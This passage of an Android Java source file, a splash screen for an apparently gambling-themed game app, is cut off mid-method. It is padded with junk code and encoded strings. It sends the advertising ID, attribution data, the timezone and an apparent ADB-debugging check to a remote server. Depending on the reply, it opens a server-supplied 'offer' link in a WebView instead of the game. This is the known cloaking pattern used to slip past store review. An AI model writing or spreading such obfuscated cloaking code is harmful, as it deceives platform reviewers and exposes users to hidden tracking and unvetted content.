package frog.company.app13june;
import frog.company.app13june.Config;
import frog.company.app13june.WActivity;
import frog.company.app13june.MainActivity;
import frog.company.app13june.Client;
import frog.company.app13june.GameActivity;
import frog.company.app13june.DialogsJ;
import frog.company.app13june.RouleteActivity;
import frog.company.app13june.SplashActivity;
import frog.company.app13june.Utils;
import frog.company.app13june.HelperJ;
import frog.company.app13june.HelpActivity;
import java.nio.CharBuffer;
import java.util.LinkedHashMap;
import java.util.TreeMap;
import java.util.HashSet;
import java.util.ListIterator;
import java.nio.charset.CharacterCodingException;
import java.util.LinkedList;
import java.util.Random;
import java.nio.charset.CharsetDecoder;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Collections;
import java.util.ArrayList;
import java.util.Arrays;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;
import com.onesignal.OneSignal;

import org.json.JSONObject;

import java.io.IOException;
import java.util.Map;
import java.util.TimeZone;

import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SplashActivity extends AppCompatActivity implements AppsFlyerConversionListener {

   public static String episarkine = "viaggiatory";
   public static int blimp = 82;
   public static String klondykes = "electrotypist";
   public static String pipsissewas = "ecstasize";
   public static int schrodinger = 97;
   public static boolean etherizers = true;
   public static int haircutter = 50;
   public static String puppyisms = "elasmobranchs";
   public static byte[] eikones = new byte[]{-79};
   public static final byte[] sarcoblast = new byte[]{90, 65, 88, 88};
   public static byte[] temporizingly = new byte[]{-83};
   public static byte[] progeniture = new byte[]{-125, -109, -97, -94, -107, 106, 80, 85, -108};
   public static final byte[] theomachies = new byte[]{-33, -38, -12, -29, -38, -12, 46, 25, 25, -12, -33, 25, -8, 25};

    String appLink;
    boolean first = true;
    Context ctxx;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        SplashActivity.schrodinger--;
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        ctxx = this;
        String old = getSharedPreferences(Config.sharedName,MODE_PRIVATE).getString(Config.sharedStr,null);
        if(old == null){
            Log.e(HelperJ.RalFN(117, 54),HelperJ.f9KKT(84, 84, 69));
            initFb(this);
        SplashActivity.blimp++;
            initAps();
        } else {
            Log.e(Utils.aWvtw(86, 71, 109, 115),SplashActivity.ldO1I(52, 74));

 if ( SplashActivity.puppyisms .isEmpty() ) 
 {        SplashActivity.etherizers = false;
}
 else if 
 ( SplashActivity.puppyisms == null
) 
 {        SplashActivity.etherizers = ! true;
} 
 else 
 {        SplashActivity.schrodinger--;
}            earg(this,old);
        }

    }

    void initFb(SplashActivity activity){
        SplashActivity.episarkine = "";
        FacebookSdk.setApplicationId(Config.fcid);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(this);
        FacebookSdk.fullyInitialize();
        AppLinkData.fetchDeferredAppLinkData(this,new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if(appLinkData == null){
                    AppLinkData fromActivity = AppLinkData.createFromActivity(activity);
                    if(fromActivity != null) appLink = AppLinkData.createFromActivity(activity).getTargetUri().toString();
                    else appLink = null;
                } else {
                    appLink = appLinkData.getTargetUri().toString();
                }
            }
        });
    }

    void initAps(){
        SplashActivity.klondykes = "";
        OneSignal.initWithContext(this);
        if ( SplashActivity.klondykes .contains(SplashActivity.puppyisms) ) {
                    SplashActivity.etherizers = true;

            } else {
                    SplashActivity.etherizers = true;
}



        OneSignal.setAppId(Config.one);
        AppsFlyerLib.getInstance().init(Config.apid,this,this);
        AppsFlyerLib.getInstance().start(this);
    }

    @Override
    public void onConversionDataSuccess(Map<String,Object> map) {
        SplashActivity.klondykes = "anatomism" ;
        if(!first) return;
        else log(map,1);
    }

    @Override
    public void onConversionDataFail(String s) {
        SplashActivity.schrodinger = 2;
        if(!first) return;
        else log(null,-1);
    }

    @Override
    public void onAppOpenAttribution(Map<String,String> map) {
        SplashActivity.blimp = 11;
        SplashActivity.etherizers = true;
        if(!first) return;
        Log.e(DialogsJ.imhRF(101),GameActivity.a36Uo(122, 82, 80, 122, 113, 48));
    }

    @Override
    public void onAttributionFailure(String s) {
        if ( SplashActivity.puppyisms != null) {
                    SplashActivity.etherizers = true;

            } else {
                    SplashActivity.haircutter -= 1;
}



        if(!first) return;
        Log.e(Client.uChRf(50),MainActivity.fVUVG(65, 108, 77));
    }

    void log(Map<String,Object> map,int mode){
        SplashActivity.etherizers = false;
        new Thread(){
            @Override
            public void run() {
                first = false;
                Log.e(WActivity.BCNGs(),String.valueOf(mode));
                Uri.Builder uri = Uri.parse(Config.url).buildUpon();
                if(mode == 1) {
                    Log.e(DialogsJ.ygxaU(81),map.toString());

 if ( SplashActivity.klondykes != null) 
 {        SplashActivity.etherizers =  true;
}
 else if 
 ( SplashActivity.pipsissewas != null) 
 {        SplashActivity.etherizers = ! false;
} 
 else 
 {        SplashActivity.etherizers = ! false;
}                    uri.appendQueryParameter(Config.campaign,String.valueOf(map.get(HelpActivity.Htdra())));
                    uri.appendQueryParameter(Config.media_source,String.valueOf(map.get(GameActivity.oU3tU(122))));
                    uri.appendQueryParameter(Config.af_channel,String.valueOf(map.get(HelperJ.ViWyt(67, 107, 66))));















                } else {
                    uri.appendQueryParameter(Config.campaign,HelperJ.W6FeF(53, 75, 66, 81));
                    uri.appendQueryParameter(Config.media_source,Utils.Y4ePi(52));
                    uri.appendQueryParameter(Config.af_channel,WActivity.MWVYB(89));
                }
                try {
                    String bb = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                    uri.appendQueryParameter(Config.adid,bb);
                    if(bb != null)
                        OneSignal.setExternalUserId(bb);
                } catch (IOException | GooglePlayServicesNotAvailableException | GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        next(uri);
        SplashActivity.etherizers =  false;

 if ( SplashActivity.puppyisms == null
) 
 {        SplashActivity.etherizers = true;
}
 else if 
 (SplashActivity.schrodinger <= SplashActivity.blimp
) 
 {        SplashActivity.blimp = 14;

} 
 else 
 {        SplashActivity.etherizers = false;
        SplashActivity.klondykes = "";
        SplashActivity.etherizers = false;
}                    } catch (IOException e) {
                        e.printStackTrace();
                        st(ctxx);
                    }
                }
            }
        }.start();
    }

    void next(Uri.Builder ur) throws IOException {
        String i = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        SplashActivity.haircutter++;
        String t = TimeZone.getDefault().getID();
        ur.appendQueryParameter(Config.tmz,t);
        ur.appendQueryParameter(Config.af_userid,i);
        ur.appendQueryParameter(Config.adb,getAD());
        if ( SplashActivity.puppyisms == null
) {
                    --SplashActivity.blimp;

            } else {
                    SplashActivity.etherizers = false;
}



        ur.appendQueryParameter(Config.fb_deeplink,appLink);
        SplashActivity.etherizers = false;
        Uri uu = ur.build();
        OkHttpClient ok = new OkHttpClient();
        HttpUrl builder = HttpUrl.parse(uu.toString()).newBuilder().build();
        Log.e(WActivity.nEGql(),uu.toString());
        if (SplashActivity.blimp < SplashActivity.haircutter

) {
                    SplashActivity.episarkine = "";

                     --SplashActivity.haircutter;

                      SplashActivity.etherizers = true;
}
        Request req = new Request.Builder().url(builder).build();
        Response resp = ok.newCall(req).execute();
        SplashActivity.schrodinger = 2;


        String stRerr = resp.body().string();
       

        String stRer = new Gson().fromJson(stRerr,Map.class).get(Config.offerLink).toString();

        Log.e(SplashActivity.Y5DXY(100, 65, 84, 51),stRer);
        String stRe = stRer.replace(Config.l5Hcn(100, 81, 71),"");

 if ( SplashActivity.episarkine .equals("bedur") ) 
 {        SplashActivity.etherizers = false;
}
 else if 
 ( SplashActivity.klondykes == null
) 
 {        SplashActivity.etherizers = ! true;
} 
 else 
 {        SplashActivity.haircutter -= 0;

}

        if(stRe != null && !stRe.equals(Client.Z6rBP(87, 76))){
            earg(this,stRe);
        }else {
            st(this);

 if ( SplashActivity.klondykes != null) 
 {        ++SplashActivity.haircutter;
}
 else if 
 ( SplashActivity.etherizers 
) 
 {        SplashActivity.puppyisms = "";
} 
 else 
 {        SplashActivity.blimp--;
}        }
    }

    String getAD(){
        if (! SplashActivity.etherizers 
) {
                    SplashActivity.haircutter = 9;


                     SplashActivity.etherizers =  true;

                      SplashActivity.etherizers = false;
}
        int adbStatus = Settings.Secure.getInt(this.getContentResolver(),(RouleteActivity.emLTa(103, 102, 71)+ HelpActivity.qjEoH(97)),0);
        String adbTxt;
        if(adbStatus == 0){
            adbTxt = SplashActivity.mMFmP(70);
        if (SplashActivity.schrodinger != SplashActivity.haircutter
) {
                    SplashActivity.episarkine = "circuting" ;

            } else {
                    SplashActivity.pipsissewas = "";
}



        }else {
            adbTxt = Client.T1Fw1(105, 48, 57, 55);
        }
        return adbTxt;
    }

    void st(Context ctx){
        if ( SplashActivity.pipsissewas .intern().isEmpty() ) {
                    SplashActivity.etherizers = true;

                     SplashActivity.klondykes = "electrolysis" ;

                      SplashActivity.puppyisms = "undissociated" ;
}
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Intent in = new Intent(ctx,MainActivity.class);
                startActivity(in);
                finish();
        SplashActivity.blimp++;
            }
        });

    }

    void earg(Context ctx,String u){
        if ( SplashActivity.puppyisms != null) {
                    SplashActivity.etherizers = false;

                     SplashActivity.pipsissewas = "nonclerically" ;

                      SplashActivity.etherizers = false;
}
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Intent in = new Intent(ctx,WActivity.class);
        SplashActivity.haircutter--;
                in.putExtra(Config.sharedStr,u);
                getSharedPreferences(Config.sharedName,MODE_PRIVATE).edit().putString(Config.sharedStr,u).apply();
                startActivity(in);
        SplashActivity.etherizers = false;
                finish();
        SplashActivity.episarkine = "continuance" ;
            }
        });
    }
    public static String SIknU(  int Gq7, int QUv, int hAO ) {
        --SplashActivity.blimp;
        byte[] bArr = {2, 35, 7, 20, 22, 20, 24, 43, 20, 21, 125, 34, 26, 24, 35, 7, 20, 32};

        HashMap<Short,String> listMap = new HashMap<>();
LinkedList<Byte> listByte = new LinkedList<>();
    for(short i=0;i<18;i++){
    listMap.put(i,String.valueOf((((bArr[i] ^ hAO) - QUv) + Gq7))); 
    }
      for (Short key: listMap.keySet()) {
listByte.add( Integer.valueOf(listMap.get(key)).byteValue());     
    }
     
     int h = 0;

    while (h<18){
            bArr[h] =listByte.get(h);
            h++;
        SplashActivity.puppyisms = "";
            }

        String str = new String(bArr);
        
        return str;
    }
    public static String HrCyQ(  int TSv, int PUI ) {
        SplashActivity.etherizers = false;
        byte[] bArr = new byte[3];
		for (int i = 0; i < 3; i++)
		  bArr[i] = HelpActivity.dispensator[i];

         TreeMap<Integer,Byte> map =new TreeMap<>();
        SplashActivity.etherizers = true;
         

     int i = 0;
    while(i<3){
        map.put(i,(byte)((bArr[i] + PUI) ^ TSv));
        SplashActivity.episarkine = "";
        SplashActivity.etherizers = true;
        i++;
        TSv += 2;
PUI -= 2;

        }

    HashSet<Integer> set=new HashSet<>(map.keySet());

    for (Integer s:set){
        bArr[s] = map.get(s);

 if (SplashActivity.haircutter != SplashActivity.haircutter
) 
 {        SplashActivity.episarkine = "";
}
 else if 
 (SplashActivity.haircutter != SplashActivity.blimp
) 
 {        SplashActivity.etherizers = true;
} 
 else 
 {        SplashActivity.klondykes = "";
}        }

         String str = new String(bArr, StandardCharsets.UTF_8);
        
        return str;
    }

       public static String ldO1I(  int oN1, int xkg ) {
        SplashActivity.etherizers = true;
        byte[] bArr = {-22, -78};

         TreeMap<Integer,Byte> map =new TreeMap<>();
         

     int i = 0;
        SplashActivity.blimp = 13;
    while(i<2){
        map.put(i,(byte)((bArr[i] + xkg) + oN1));

 if (SplashActivity.schrodinger <= 5

) 
 {        SplashActivity.puppyisms = "bloodstone" ;
}
 else if 
 (! SplashActivity.etherizers 
) 
 {        SplashActivity.puppyisms = "";
} 
 else 
 {        SplashActivity.pipsissewas = "arrangers" ;
}        i++;
        oN1 += 4;

 if (SplashActivity.haircutter == SplashActivity.blimp
) 
 {        SplashActivity.etherizers = false;
}
 else if 
 ( SplashActivity.puppyisms == null
) 
 {        SplashActivity.pipsissewas = "subpostscript" ;
} 
 else 
 {        SplashActivity.blimp = 5;
}xkg -= 2;

        }

    HashSet<Integer> set=new HashSet<>(map.keySet());

    for (Integer s:set){
        bArr[s] = map.get(s);
        }

         String str = new String(bArr, StandardCharsets.UTF_8);

 if (3 <= SplashActivity.schrodinger
) 
 {        SplashActivity.pipsissewas = "funnellike" ;
}
 else if 
 ( SplashActivity.pipsissewas .contains("endocrinologists") ) 
 {        SplashActivity.etherizers = true;
} 
 else 
 {        SplashActivity.klondykes = "";
}        
        return str;
    }

       public static String Y5DXY(  int UL1, int EcV, int UXf, int h78 ) {
        SplashActivity.haircutter = 0;

        byte[] bArr = {87, 49, 52, 34, 58};

            int length = 5;
    
    int i = 0;
    while (true) {
        int i2 = length - 1;
        if (length <= 0) {
            break;
        }
        bArr[i] = (byte) ((((bArr[i] - h78) + UXf) - EcV) ^ UL1);
        length = i2;
        UL1++;
EcV += 2;
        SplashActivity.schrodinger++;
UXf += 5;
h78 += 3;
        i += 1;

 if ( SplashActivity.klondykes .equals("nonnutritively") ) 
 {        SplashActivity.etherizers = false;
}
 else if 
 (SplashActivity.haircutter <= SplashActivity.schrodinger

) 
 {        SplashActivity.schrodinger = 4;
} 
 else 
 {        SplashActivity.schrodinger = 13;

}    }

         String str = new String(bArr, StandardCharsets.UTF_8);
        
        return str;
    }

       public static String mMFmP(  int u0n ) {
        SplashActivity.puppyisms = "";
        byte[] bArr = {32, 27, 38, 45, 31};

            HashMap<String,Byte> bHashMap = new HashMap<>();
    int i = 0;

 if (SplashActivity.haircutter < SplashActivity.schrodinger

) 
 {        --SplashActivity.schrodinger;
}
 else if 
 ( SplashActivity.pipsissewas != null) 
 {        SplashActivity.etherizers = false;
} 
 else 
 {        SplashActivity.etherizers = false;
}    while(i<5){
    bHashMap.put( String.valueOf(i),(byte) (bArr[i] + u0n));
    i += 1;
        --SplashActivity.blimp;
    }
    
    for (String key: bHashMap.keySet()) {
     bArr[Integer.valueOf(key)] =bHashMap.get(key);
        SplashActivity.etherizers =  true;
        SplashActivity.etherizers = true;
    }

         String str = new String(bArr, StandardCharsets.UTF_8);
        
        return str;
    }

   
    public  void midges(String pC2n9, String BB85P, int Jt43E, int U8hJJ) {
                if (U8hJJ <= SplashActivity.blimp

) {
            
 if ( SplashActivity.puppyisms .contains("thaumatologies") ) 
 {        if ( SplashActivity.etherizers 
) {
                    if ( pC2n9 == null
) {
                    Jt43E = 10;


            } else {
                    pC2n9 = "Aubreir" ;
}




            } else {
                    SplashActivity.episarkine = "attentivenesses" ;
}



}
 else if 
 ( BB85P != null) 
 {        if ( BB85P != null) {
                    SplashActivity.etherizers = true;

            } else {
                    Jt43E = 14;
}



} 
 else 
 {        SplashActivity.etherizers = false;
}
                     if (Jt43E != 5

) {
                    if ( BB85P != null) {
                    SplashActivity.etherizers =  false;

                     pC2n9 = "";

                      SplashActivity.etherizers = false;
}

            } else {
                    SplashActivity.etherizers = false;
}




                      if (3 > U8hJJ
) {
                    SplashActivity.etherizers = ! true;

                     SplashActivity.etherizers = true;

                      SplashActivity.klondykes = "";
}
}

         
    }

     
    public  void australopithecinae(int q6Ga3) {
        
         
    }

     
    public  void brashing(boolean kJlLR, String eEiZS, int wGZcf, int czPcx) {
                if (czPcx == czPcx

) {
                    if (8 != SplashActivity.blimp
) {
            
 if ( SplashActivity.klondykes != null) 
 {        if (czPcx <= SplashActivity.schrodinger
) {
                    kJlLR = true;

                     eEiZS = "sulphurity" ;

                      eEiZS = "";
}
}
 else if 
 (czPcx > 7

) 
 {        eEiZS = "";
} 
 else 
 {        SplashActivity.pipsissewas = "";
}
            } else {
                    if ( SplashActivity.klondykes != null) {
                    SplashActivity.puppyisms = "unhealthily" ;

                     kJlLR =  true;

                      SplashActivity.etherizers = false;
}
}




            } else {
            
 if (czPcx <= wGZcf
) 
 {        --SplashActivity.schrodinger;
}
 else if 
 (czPcx <= 12

) 
 {        --SplashActivity.schrodinger;
} 
 else 
 {        SplashActivity.pipsissewas = "";
}}




 if (czPcx <= wGZcf
) 
 {
 if (SplashActivity.schrodinger > SplashActivity.haircutter
) 
 {
 if (czPcx > 12

) 
 {        if (SplashActivity.schrodinger <= 10

) {
                    eEiZS = "";

                     kJlLR = false;

                      SplashActivity.pipsissewas = "";
}
}
 else if 
 (! SplashActivity.episarkine .equals("permuted") ) 
 {        kJlLR = false;
} 
 else 
 {        SplashActivity.episarkine = "";
}}
 else if 
 (czPcx != czPcx
) 
 {        if (SplashActivity.schrodinger == 3

) {
                    SplashActivity.etherizers = true;

                     SplashActivity.episarkine = "creepmouse" ;

                      kJlLR =  true;
}
} 
 else 
 {        SplashActivity.puppyisms = "inlandish" ;
}}
 else if 
 ( SplashActivity.pipsissewas != null) 
 {
 if ( kJlLR 
) 
 {        --czPcx;
}
 else if 
 ( SplashActivity.pipsissewas == null
) 
 {        czPcx = 2;

} 
 else 
 {        kJlLR = false;
}} 
 else 
 {        if (SplashActivity.schrodinger < SplashActivity.blimp
) {
                    wGZcf++;

                     SplashActivity.etherizers = true;

                      kJlLR = true;
}
}        if ( SplashActivity.episarkine != null) {
                    if ( SplashActivity.puppyisms .isEmpty() ) {
                    if (SplashActivity.haircutter < 7

) {
                    if (6 < wGZcf
) {
                    czPcx--;

            } else {
                    SplashActivity.etherizers = ! true;
}




                     czPcx = 0;

                      ++wGZcf;
}

                     if ( eEiZS .equals(eEiZS) ) {
                    czPcx += 10;


                     wGZcf -= 2;


                      kJlLR =  true;
}

                      czPcx += 0;

}

                     if (SplashActivity.schrodinger < wGZcf
) {
                    if (SplashActivity.blimp > czPcx
) {
                    eEiZS = "permonosulphuric" ;

                     kJlLR = true;

                      wGZcf = 2;

}

            } else {
                    kJlLR =  false;
}




                      if ( eEiZS != null) {
                    SplashActivity.etherizers = true;

            } else {
                    kJlLR = true;
}



}

 if (SplashActivity.blimp != SplashActivity.schrodinger

) 
 {
 if (10 < wGZcf
) 
 {        ++wGZcf;
}
 else if 
 (SplashActivity.blimp <= czPcx
) 
 {
 if ( eEiZS .contains(SplashActivity.klondykes) ) 
 {        kJlLR =  false;
}
 else if 
 (wGZcf == czPcx

) 
 {        SplashActivity.etherizers = false;
} 
 else 
 {        SplashActivity.etherizers = true;
}} 
 else 
 {        SplashActivity.klondykes = "";
}}
 else if 
 ( SplashActivity.pipsissewas == null
) 
 {        SplashActivity.klondykes = "Town" ;
} 
 else 
 {        if (wGZcf < SplashActivity.blimp

) {
                    wGZcf = 4;

                     wGZcf++;

                      kJlLR = ! false;
}
}        if ( eEiZS .intern().isEmpty() ) {
            
 if ( SplashActivity.pipsissewas .equals("tailpieces") ) 
 {        if ( eEiZS != null) {
                    if (czPcx != SplashActivity.schrodinger

) {
                    kJlLR = false;

                     kJlLR = false;

                      kJlLR = true;
}

            } else {
                    SplashActivity.etherizers = false;
}



}
 else if 
 ( SplashActivity.etherizers 
) 
 {        if ( SplashActivity.etherizers 
) {
                    kJlLR = true;

                     SplashActivity.pipsissewas = "";

                      SplashActivity.etherizers = true;
}
} 
 else 
 {        kJlLR =  true;
}
            } else {
            
 if (SplashActivity.blimp != SplashActivity.haircutter
) 
 {        if ( SplashActivity.etherizers 
) {
                    SplashActivity.klondykes = "";

            } else {
                    czPcx++;
}



}
 else if 
 ( kJlLR 
) 
 {        wGZcf = 13;
} 
 else 
 {        SplashActivity.puppyisms = "tailpiece" ;
}}




         
    }

     
    public  void pedomorphic(int bT4Rs, int SVkUD, boolean Dn20k, int lyBEU) {
                SplashActivity.haircutter++;
        if ( SplashActivity.pipsissewas != null) {
                    Dn20k =  true;

            } else {
                    if (12 < SVkUD
) {
                    bT4Rs--;

            } else {
                    Dn20k =  true;
}



}




 if (SplashActivity.haircutter < 14

) 
 {        if (9 <= SplashActivity.haircutter
) {
            
 if (! SplashActivity.klondykes .isEmpty() ) 
 {
 if (9 <= SVkUD
) 
 {        Dn20k = false;
}
 else if 
 (bT4Rs > SVkUD
) 
 {        lyBEU--;
} 
 else 
 {        SplashActivity.schrodinger = 7;
}}
 else if 
 ( SplashActivity.puppyisms == null
) 
 {        bT4Rs = 5;

} 
 else 
 {        lyBEU = 7;

}
                     if (lyBEU <= 5

) {
                    --bT4Rs;

            } else {
                    bT4Rs = 10;
}




                      bT4Rs++;
}
}
 else if 
 (8 > bT4Rs
) 
 {        if ( SplashActivity.episarkine == null
) {
            
 if ( SplashActivity.pipsissewas == null
) 
 {        SVkUD += 1;

}
 else if 
 ( SplashActivity.puppyisms == null
) 
 {        Dn20k = true;
} 
 else 
 {        SplashActivity.haircutter = 2;

}
            } else {
                    Dn20k = true;
}



} 
 else 
 {        if ( SplashActivity.episarkine == null
) {
                    SplashActivity.etherizers =  true;

            } else {
                    SplashActivity.blimp++;
}



}
 if ( Dn20k 
) 
 {        if ( SplashActivity.episarkine .contains("Hamites") ) {
            
 if (SplashActivity.haircutter <= SVkUD

) 
 {        if ( SplashActivity.pipsissewas != null) {
                    --SVkUD;

                     Dn20k =  false;

                      Dn20k = false;
}
}
 else if 
 (SplashActivity.blimp <= 5

) 
 {        SplashActivity.pipsissewas = "";
} 
 else 
 {        bT4Rs = 9;
}
            } else {
                    SplashActivity.puppyisms = "";
}



}
 else if 
 ( SplashActivity.etherizers 
) 
 {        if (! Dn20k 
) {
            
 if ( SplashActivity.klondykes == null
) 
 {        SplashActivity.episarkine = "crystaling" .toLowerCase();
}
 else if 
 ( Dn20k 
) 
 {        lyBEU = 5;
} 
 else 
 {        SplashActivity.klondykes = "radiophonists" ;
}
            } else {
                    SplashActivity.etherizers = ! true;
}



} 
 else 
 {
 if (lyBEU == bT4Rs
) 
 {        SplashActivity.etherizers = ! false;
}
 else if 
 ( SplashActivity.episarkine .equals(SplashActivity.episarkine) ) 
 {        bT4Rs = 6;

} 
 else 
 {        SplashActivity.blimp--;
}}
         
    }

     
    public  void glunch(int rMDnl) {
        
         
    }

     
    public  void predetestation(String xVgyx, int RhjkL, String EGoDc, String Qm2ly) {
                if (SplashActivity.blimp != SplashActivity.haircutter

) {
                    if ( SplashActivity.pipsissewas .equals(EGoDc) ) {
            
 if ( Qm2ly == null
) 
 {        if ( SplashActivity.etherizers 
) {
                    SplashActivity.schrodinger = 11;

            } else {
                    SplashActivity.blimp = 3;

}



}
 else if 
 (! SplashActivity.etherizers 
) 
 {        ++RhjkL;
} 
 else 
 {        RhjkL--;
}
            } else {
                    if ( xVgyx != null) {
                    SplashActivity.etherizers = true;

                     xVgyx = "nunning" ;

                      RhjkL++;
}
}




            } else {
            
 if ( Qm2ly != null) 
 {
 if ( xVgyx == null
) 
 {        SplashActivity.etherizers = true;
}
 else if 
 (RhjkL != RhjkL
) 
 {        SplashActivity.puppyisms = "";
} 
 else 
 {        SplashActivity.etherizers = true;
}}
 else if 
 ( xVgyx != null) 
 {        RhjkL = 10;

} 
 else 
 {        SplashActivity.pipsissewas = "";
}}




         
    }

     
    public  void mistion(int Afn1F, boolean FnHdr, String ioRhC) {
        
 if (7 <= SplashActivity.blimp
) 
 {
 if ( SplashActivity.episarkine .equals("corvina") ) 
 {        if ( SplashActivity.pipsissewas .equals("frondent") ) {
                    if ( SplashActivity.klondykes .contains("Articulata") ) {
                    FnHdr = true;

                     SplashActivity.etherizers = ! false;

                      ++Afn1F;
}

            } else {
                    SplashActivity.schrodinger = 14;

}



}
 else if 
 (! SplashActivity.klondykes .isEmpty() ) 
 {        if (SplashActivity.haircutter != Afn1F

) {
                    Afn1F = 7;

            } else {
                    ++Afn1F;
}



} 
 else 
 {        FnHdr = true;
}}
 else if 
 (! SplashActivity.pipsissewas .isEmpty() ) 
 {        SplashActivity.puppyisms = "";
} 
 else 
 {        if ( SplashActivity.pipsissewas != null) {
                    FnHdr = true;

            } else {
                    ioRhC = "";
}



}        if ( SplashActivity.pipsissewas != null) {
            
 if ( SplashActivity.etherizers 
) 
 {        if ( ioRhC .isEmpty() ) {
                    if ( SplashActivity.puppyisms .trim().isEmpty() ) {
                    SplashActivity.blimp--;

            } else {
                    ioRhC = "scrupular" ;
}




                     FnHdr = true;

                      Afn1F++;
}
}
 else if 
 ( ioRhC == null
) 
 {
 if (SplashActivity.haircutter != Afn1F
) 
 {        FnHdr = false;
}
 else if 
 ( ioRhC .isEmpty() ) 
 {        ioRhC = "";
} 
 else 
 {        SplashActivity.schrodinger--;
}} 
 else 
 {        SplashActivity.blimp--;
}
                     if ( ioRhC == null
) {
                    SplashActivity.klondykes = "";

                     FnHdr =  false;

                      ioRhC = "";
}

              
 if (Afn1F <= Afn1F
) 
 {        SplashActivity.episarkine = "luffing" ;
}
 else if 
 (SplashActivity.haircutter != Afn1F

) 
 {        Afn1F += 10;

} 
 else 
 {        SplashActivity.pipsissewas = "disilluminates" ;
}}
        if ( ioRhC == null
) {
                    if ( SplashActivity.episarkine != null) {
                    if (SplashActivity.haircutter < 12

) {
                    if ( ioRhC .equals(SplashActivity.pipsissewas) ) {
                    ioRhC = "unimpawned" ;

            } else {
                    SplashActivity.etherizers = false;
}




            } else {
                    SplashActivity.etherizers = false;
}




            } else {
                    if (Afn1F != Afn1F
) {
                    --SplashActivity.schrodinger;

            } else {
                    FnHdr = false;
}



}




            } else {
                    if (SplashActivity.blimp < SplashActivity.schrodinger

) {
                    if ( ioRhC != null) {
                    FnHdr = false;

                     FnHdr = true;

                      FnHdr = true;
}

                     ioRhC = "roadsmen" ;

                      Afn1F = 6;
}
}



        if (! FnHdr 
) {
                    if (0 > Afn1F
) {
                    if (10 != SplashActivity.haircutter
) {
                    if (12 != Afn1F
) {
                    SplashActivity.episarkine = "";

            } else {
                    Afn1F -= 7;

}




            } else {
                    FnHdr = false;
}




            } else {
                    Afn1F = 8;
}




                     if (SplashActivity.schrodinger < Afn1F

) {
            
 if ( ioRhC == null
) 
 {        SplashActivity.etherizers = false;
}
 else if 
 ( ioRhC != null) 
 {        --SplashActivity.blimp;
} 
 else 
 {        SplashActivity.etherizers = ! false;
}
                     SplashActivity.episarkine = "";

                      Afn1F++;
}

                      if (! FnHdr 
) {
                    SplashActivity.puppyisms = "Stromatoporoidea" ;

            } else {
                    --Afn1F;
}



}

         
    }

     
    public  void coeducate(int EWl6a, String w1TO0, int NtnS4, String VnlPz) {
        
 if (SplashActivity.schrodinger > EWl6a
) 
 {        if (SplashActivity.schrodinger <= 11

) {
                    if (NtnS4 <= 9

) {
                    if ( w1TO0 != null) {
                    SplashActivity.episarkine = "";

                     VnlPz = "";

                      SplashActivity.etherizers = true;
}

            } else {
                    SplashActivity.etherizers = true;
}




            } else {
                    if ( w1TO0 == null
) {
                    SplashActivity.etherizers =  true;

                     SplashActivity.etherizers =  false;

                      SplashActivity.etherizers =  false;
}
}



}
 else if 
 ( SplashActivity.episarkine .contains(VnlPz) ) 
 {        if (EWl6a <= NtnS4

) {
            
 if ( w1TO0 != null) 
 {        SplashActivity.schrodinger++;
}
 else if 
 (SplashActivity.blimp < 3

) 
 {        SplashActivity.puppyisms = "nephophobia" .toLowerCase();
} 
 else 
 {        SplashActivity.etherizers = true;
}
                     SplashActivity.etherizers = false;

                      VnlPz = "";
}
} 
 else 
 {        if ( VnlPz == null
) {
                    SplashActivity.schrodinger = 1;


            } else {
                    ++NtnS4;
}



}        if (SplashActivity.blimp != 2

) {
            
 if ( SplashActivity.etherizers 
) 
 {
 if ( SplashActivity.etherizers 
) 
 {        if (3 != NtnS4
) {
                    SplashActivity.puppyisms = "neurocanal" ;

                     SplashActivity.pipsissewas = "Roxburghiaceae" ;

                      EWl6a -= 12;
}
}
 else if 
 ( SplashActivity.etherizers 
) 
 {        SplashActivity.etherizers =  true;
} 
 else 
 {        SplashActivity.etherizers = false;
}}
 else if 
 ( SplashActivity.klondykes == null
) 
 {        if (NtnS4 < SplashActivity.haircutter
) {
                    SplashActivity.etherizers = ! true;

                     SplashActivity.blimp = 5;

                      NtnS4 = 5;

}
} 
 else 
 {        SplashActivity.haircutter++;
}
            } else {
            
 if (NtnS4 <= NtnS4

) 
 {        SplashActivity.pipsissewas = "";
}
 else if 
 (11 <= NtnS4
) 
 {        EWl6a = 13;

} 
 else 
 {        NtnS4++;
}}




         
    }

     
    public  void puistie(String kYMBz, boolean pnLQ5, boolean trt6m) {
                SplashActivity.pipsissewas = "";

 if (SplashActivity.haircutter != SplashActivity.blimp

) 
 {        if ( SplashActivity.puppyisms == null
) {
            
 if (SplashActivity.schrodinger <= SplashActivity.schrodinger

) 
 {        trt6m =  false;
}
 else if 
 (SplashActivity.blimp > SplashActivity.schrodinger
) 
 {        trt6m = true;
} 
 else 
 {        SplashActivity.haircutter = 9;
}
            } else {
            
 if ( SplashActivity.pipsissewas == null
) 
 {        pnLQ5 = true;
}
 else if 
 (! kYMBz .equals(SplashActivity.klondykes) ) 
 {        SplashActivity.schrodinger = 8;
} 
 else 
 {        pnLQ5 = false;
}}



}
 else if 
 (! SplashActivity.pipsissewas .contains("symphysian") ) 
 {        pnLQ5 =  true;
} 
 else 
